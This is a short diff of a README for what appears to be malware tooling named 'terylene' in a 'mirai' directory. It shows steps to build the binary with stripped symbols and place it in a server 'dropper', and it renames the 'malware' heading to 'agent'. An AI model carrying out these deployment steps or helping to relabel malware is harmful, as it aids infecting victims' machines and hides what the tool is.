@@ -96,7 +96,7 @@ cd mirai
 sudo go build -ldflags="-s -w" terylene.go
 ```
 
-### drop the terylene malware into the dropper
+### drop the terylene agent into the dropper
 
 ```
 mv terylene ../server/dropper
@@ -107,10 +107,6 @@ mv terylene ../server/dropper
 ```
 ./server
 ```
-
->Enjoy ;)
-
-
 
 # ZeroMq and Terylene infrastructure
 
